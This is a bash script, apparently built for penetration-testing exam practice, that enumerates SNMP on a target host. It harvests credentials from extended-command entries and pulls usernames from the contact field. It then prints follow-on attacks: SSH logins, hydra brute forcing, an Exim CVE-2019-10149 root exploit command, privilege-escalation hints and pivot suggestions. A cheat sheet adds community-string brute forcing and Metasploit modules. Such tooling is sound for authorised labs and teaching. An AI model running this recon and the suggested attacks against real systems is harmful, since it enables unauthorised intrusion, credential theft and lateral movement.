#!/bin/bash
# =============================================================================
# snmp-korek.sh - SNMP Recon (Exam Focused)
# Priority: credentials first, then CVEs, then pivots
# Author: korek
# =============================================================================
# Usage:
#   ./snmp-korek.sh <ip>               scan with 'public' community
#   ./snmp-korek.sh <ip> <community>   scan with custom community string
#   ./snmp-korek.sh --help             show usage
#   ./snmp-korek.sh --examples         show all manual snmp commands + cheatsheet
#
# Examples:
#   ./snmp-korek.sh 192.168.1.10
#   ./snmp-korek.sh 192.168.1.10 private
#   ./snmp-korek.sh 192.168.1.10 internal
# =============================================================================

# Colors defined FIRST so all functions can use them
R='\033[0;31m'; G='\033[0;32m'; Y='\033[0;33m'
C='\033[0;36m'; W='\033[1;37m'; N='\033[0m'

hit()  { echo -e "${G}[+]${N} $1"; }
info() { echo -e "    ${W}>>>${N} $1"; }
sec()  { echo -e "\n${C}[*] ===== $1 =====${N}"; }
warn() { echo -e "${Y}[!]${N} $1"; }
hot()  { echo -e "${R}[!!]${N} $1"; }
expl() { echo -e "    ${Y}[EXPLOIT]${N} $1"; }

# =============================================================================
print_help() {
    echo ""
    echo -e "${C}  snmp-korek.sh - SNMP Recon (Exam Focused)${N}"
    echo ""
    echo "Usage:"
    echo "  $0 <ip>                scan with 'public' community"
    echo "  $0 <ip> <community>   scan with custom community"
    echo "  $0 --examples         show all manual snmp commands"
    echo ""
    echo "Examples:"
    echo "  $0 192.168.1.10"
    echo "  $0 192.168.1.10 private"
    echo "  $0 192.168.1.10 internal"
    echo ""
    exit 0
}

print_examples() {
    echo ""
    echo -e "${C}================================================${N}"
    echo -e "${C}  SNMP Manual Command Reference${N}"
    echo -e "${C}================================================${N}"

    echo -e "\n${Y}[1] Brute force community string:${N}"
    echo "  onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <ip>"
    echo "  onesixtyone -c /usr/share/wordlists/metasploit/snmp_default_pass.txt <ip>"

    echo -e "\n${Y}[2] Full dump (most info):${N}"
    echo "  snmp-check <ip>"
    echo "  snmp-check <ip> -c private"
    echo "  snmpwalk -v2c -c public <ip> > snmp_full.txt"

    echo -e "\n${Y}[3] Targeted walks (exam focused):${N}"
    echo ""
    echo -e "  ${G}# CREDENTIALS - check first!${N}"
    echo "  snmpwalk -v2c -c public <ip> NET-SNMP-EXTEND-MIB::nsExtendObjects"
    echo ""
    echo -e "  ${G}# System info + hostname${N}"
    echo "  snmpwalk -v2c -c public <ip> system"
    echo ""
    echo -e "  ${G}# Running processes${N}"
    echo "  snmpwalk -v2c -c public <ip> hrSWRunName"
    echo "  snmpwalk -v2c -c public <ip> hrSWRunPath"
    echo "  snmpwalk -v2c -c public <ip> hrSWRunParameters"
    echo ""
    echo -e "  ${G}# Installed software + versions${N}"
    echo "  snmpwalk -v2c -c public <ip> hrSWInstalledName"
    echo ""
    echo -e "  ${G}# TCP connections + listening ports${N}"
    echo "  snmpwalk -v2c -c public <ip> tcpConnState"
    echo "  snmpwalk -v2c -c public <ip> tcpConnLocalPort"
    echo ""
    echo -e "  ${G}# Network interfaces${N}"
    echo "  snmpwalk -v2c -c public <ip> ifDescr"
    echo "  snmpwalk -v2c -c public <ip> ipAdEntAddr"
    echo ""
    echo -e "  ${G}# Windows user accounts${N}"
    echo "  snmpwalk -v2c -c public <ip> .1.3.6.1.4.1.77.1.2.25"
    echo ""
    echo -e "  ${G}# Routing table (pivot check)${N}"
    echo "  snmpwalk -v2c -c public <ip> ipRouteTable"
    echo ""

    echo -e "\n${Y}[4] Example nsExtendObjects output (what to look for):${N}"
    echo -e "  ${R}NET-SNMP-EXTEND-MIB::nsExtendCommand.\"reset\" = /bin/sh${N}"
    echo -e "  ${R}NET-SNMP-EXTEND-MIB::nsExtendArgs.\"reset\" = -c \"echo 'jack:Password123' | chpasswd\"${N}"
    echo -e "  ${R}NET-SNMP-EXTEND-MIB::nsExtendOutput1Line.\"check\" = root:x:0:0:root:/root:/bin/bash${N}"
    echo ""
    echo -e "  ${Y}→ Look for: passwords, commands, usernames, file contents${N}"
    echo ""

    echo -e "\n${Y}[5] SNMPv3 (if v1/v2c fails):${N}"
    echo "  snmpwalk -v3 -u admin -l authPriv -a MD5 -A password -x DES -X password <ip>"
    echo "  nmap -sU -p 161 --script snmp-brute <ip>"
    echo ""

    echo -e "\n${Y}[6] Metasploit modules:${N}"
    echo "  use auxiliary/scanner/snmp/snmp_login"
    echo "  use auxiliary/scanner/snmp/snmp_enum"
    echo "  use auxiliary/scanner/snmp/snmp_enumusers"
    echo "  use auxiliary/scanner/snmp/snmp_enumshares"
    echo ""
    exit 0
}

# =============================================================================
# Handle flags AFTER colors and functions are defined
# =============================================================================
case "$1" in
    -h|--help)     print_help ;;
    -e|--examples) print_examples ;;
    "")            print_help ;;
esac

IP="$1"
COMM="${2:-public}"
VER="2c"

sw() { snmpwalk -v$VER -c $COMM -Oqv "$IP" "$1" 2>/dev/null; }
sg() { snmpwalk -v$VER -c $COMM -Oqv "$IP" "$1" 2>/dev/null | head -1 | tr -d '"'; }

echo -e "${C}================================================${N}"
echo -e "${C}  snmp-korek.sh - SNMP Recon (Exam Focused)${N}"
echo -e "${C}  Target: $IP | Community: $COMM${N}"
echo -e "${C}================================================${N}"

# =============================================================================
# Test connectivity - try v2c first then v1
# =============================================================================
# =============================================================================
# Test connectivity - try v2c first then v1
# =============================================================================
test_result=$(snmpwalk -v2c -c "$COMM" -Oqv "$IP" .1.3.6.1.2.1.1.1.0 2>/dev/null | head -1)
if [[ -n "$test_result" ]]; then
    VER="2c"
    hit "Connected! SNMP v2c community '$COMM'"
else
    test_result=$(snmpwalk -v1 -c "$COMM" -Oqv "$IP" .1.3.6.1.2.1.1.1.0 2>/dev/null | head -1)
    if [[ -n "$test_result" ]]; then
        VER="1"
        hit "Connected! SNMP v1 community '$COMM'"
    else
        # last resort - try without -Oqv flag
        test_result=$(snmpwalk -v2c -c "$COMM" "$IP" .1.3.6.1.2.1.1.1.0 2>/dev/null | head -1)
        if [[ -n "$test_result" ]]; then
            VER="2c"
            hit "Connected! SNMP v2c community '$COMM'"
        else
            echo "[-] Cannot connect with community '$COMM'"
            echo "[-] Try: onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $IP"
            echo "[-] Or:  $0 $IP private"
            exit 1
        fi
    fi
fi

# ==========================================================================
# PRIORITY 1: Extended commands - most likely to have credentials
# ==========================================================================
sec "SNMP EXTENDED COMMANDS (credentials/commands)"
extend=$(snmpwalk -v$VER -c $COMM "$IP" NET-SNMP-EXTEND-MIB::nsExtendObjects 2>/dev/null)
if [[ -n "$extend" ]]; then
    hot "Extended commands found!"
    echo "$extend" | while read line; do
        if echo "$line" | grep -qiE "pass|pwd|secret|key|chpasswd|shadow|echo.*:"; then
            hot "$line"
            echo "$line" | grep -oE '[a-zA-Z0-9_-]+:[a-zA-Z0-9!@#$%^&*()_+=-]{6,}' | \
            while read cred; do
                hot "CREDENTIAL: $cred"
                user=$(echo "$cred" | cut -d: -f1)
                pass=$(echo "$cred" | cut -d: -f2-)
                expl "ssh $user@$IP"
                expl "ftp $IP  →  user: $user  pass: $pass"
            done
        else
            info "$line"
        fi
    done
else
    info "No extended commands configured"
fi

# ==========================================================================
# PRIORITY 2: System info - extract usernames from contact
# ==========================================================================
sec "SYSTEM INFO & USERNAME EXTRACTION"
hostname=$(sg .1.3.6.1.2.1.1.5.0)
desc=$(sg .1.3.6.1.2.1.1.1.0)
contact=$(sg .1.3.6.1.2.1.1.4.0)
location=$(sg .1.3.6.1.2.1.1.6.0)

hit "Hostname: $hostname"
info "OS: $desc"
[ -n "$location" ] && info "Location: $location"

if [[ -n "$contact" ]]; then
    hit "Contact: $contact"
    echo "$contact" | grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+' | \
    while read email; do
        user=$(echo "$email" | cut -d@ -f1)
        hot "USERNAME: $user (from $email)"
        expl "ssh $user@$IP"
        expl "hydra -l $user -P /usr/share/wordlists/rockyou.txt ssh://$IP"
    done
fi

# ==========================================================================
# PRIORITY 3: Vulnerable software - CVE flags
# ==========================================================================
sec "VULNERABLE SOFTWARE (CVE flags)"
sw hrSWInstalledName 2>/dev/null | tr -d '"' | sort -u | while read pkg; do
    name=$(echo "$pkg" | sed 's/-[0-9].*//' | tr '[:upper:]' '[:lower:]')
    case "$name" in
        exim4|exim)
            ver=$(echo "$pkg" | grep -oE '[0-9]+\.[0-9]+\.?[0-9]*' | head -1)
            minor=$(echo "$ver" | cut -d. -f2)
            if [[ "$minor" -ge 87 && "$minor" -le 91 ]]; then
                hot "Exim $ver - CVE-2019-10149 RCE AS ROOT!"
                expl "python2.7 exploit.py --rhost $IP --rport 25 --lhost LHOST --lport LPORT"
                expl "searchsploit exim 4.9"
            fi ;;
        vesta)
            hot "Vesta Control Panel - https://$IP:8083"
            expl "searchsploit vesta control panel"
            expl "Try creds: admin/admin or check install email" ;;
        rssh)
            hot "rssh - restricted shell bypass!"
            expl "searchsploit rssh" ;;
        lxd|lxc)
            hot "LXD installed - privesc if in lxd group!"
            expl "After shell: id | grep lxd" ;;
        docker*)
            hot "Docker - check socket!"
            expl "After shell: ls -la /var/run/docker.sock" ;;
        screen)
            ver=$(echo "$pkg" | grep -oE '[0-9]+\.[0-9]+' | head -1)
            [[ "$ver" == "4.5" ]] && \
                hot "screen 4.5 - CVE-2017-5618 SUID privesc!" && \
                expl "searchsploit screen 4.5" ;;
        fail2ban)
            warn "fail2ban active - brute force may get you banned!" ;;
        clamav*)
            warn "ClamAV running - AV may detect payloads" ;;
        phpmyadmin)
            hit "phpMyAdmin - http://$IP:8080/phpmyadmin" ;;
        roundcube*)
            hit "Roundcube - http://$IP:8080/roundcube" ;;
    esac
done

# ==========================================================================
# PRIORITY 4: Internal ports not visible from nmap
# ==========================================================================
sec "INTERNAL PORTS (localhost-only)"
snmpwalk -v$VER -c $COMM -OQn "$IP" TCP-MIB::tcpConnState 2>/dev/null | \
grep "listen" | \
sed 's/TCP-MIB::tcpConnState\.\([0-9.]*\)\.\([0-9]*\)\..*/\1:\2/' | \
grep "^127\." | sort -t: -k2,2n | \
while IFS=: read addr port; do
    warn "Internal only: $addr:$port"
    case "$port" in
        8080|8081|8082|8083|8084|8085) info "Web - try via shell: curl http://127.0.0.1:$port" ;;
        3306) info "MySQL - try: mysql -u root localhost" ;;
        5432) info "PostgreSQL - try: psql -h localhost -U postgres" ;;
        6379) info "Redis - try: redis-cli -h 127.0.0.1" ;;
        27017) info "MongoDB - try: mongosh localhost" ;;
        953)  info "BIND rndc control channel" ;;
        783)  info "SpamAssassin spamd" ;;
    esac
done

# ==========================================================================
# PRIORITY 5: Pivot - different subnet
# ==========================================================================
sec "NETWORK / PIVOT CHECK"
sw ipAdEntAddr 2>/dev/null | tr -d '"' | grep -v "127.0.0.1" | \
while read ip_addr; do
    [ -z "$ip_addr" ] && continue
    mynet=$(echo "$IP" | cut -d. -f1-3)
    targetnet=$(echo "$ip_addr" | cut -d. -f1-3)
    if [[ "$mynet" != "$targetnet" ]]; then
        hot "DIFFERENT SUBNET: $ip_addr - PIVOT OPPORTUNITY!"
        expl "Set up ligolo/chisel to reach $targetnet.0/24"
    else
        hit "IP: $ip_addr"
    fi
done

# ==========================================================================
echo ""
echo -e "${C}================================================${N}"
hit "Done! Check ${R}[!!]${N} first, then ${Y}[!]${N}, then ${G}[+]${N}"
echo -e "${C}================================================${N}"
echo ""
echo -e "${Y}Full dump if needed:${N}"
echo "  snmp-check $IP"
echo "  snmpwalk -v2c -c $COMM $IP > snmp_full_$IP.txt"
[ "$COMM" == "public" ] && echo "  Try private: $0 $IP private"
